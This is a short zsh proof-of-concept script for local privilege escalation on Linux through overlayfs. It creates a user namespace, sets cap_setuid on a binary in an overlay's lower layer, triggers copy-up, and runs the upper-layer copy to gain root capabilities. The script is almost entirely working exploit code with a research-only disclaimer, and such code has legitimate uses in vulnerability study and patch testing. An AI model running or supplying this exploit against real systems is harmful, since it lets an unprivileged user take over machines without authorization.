#!/usr/bin/zsh
########################################################################
# $Id: ofsexploit v1.0 2023-11-11 15:55:30 +0100 .m0rph $
########################################################################
# Privilege escalation via overlayfs...
#
# Credits:
#    Found on https://gist.github.com/win3zz
# 
# ---------------------------------------------------------------------
# Disclaimer:
#    This Proof of Concept is intended for reasearch and educational
#    purposes only. Any actions taken based on the information
#    provided in this repository are solely at the users own risk. The
#    vulnerabilites described in this report should not be exploited
#    in any unauthorized or malicious manner. The authors and
#    contributors are not responsible for any misuse or damage that may
#    result from the use of this information.
# 
########################################################################

unshare -rm sh -c "
mkdir l u w m &&
cp privtest l/ &&
setcap cap_setuid+eip l/privtest &&
mount -t overlay overlay -o rw,lowerdir=l,upperdir=u,workdir=w m &&
touch m/privtest &&
u/privtest;"

exit 0

# EOF
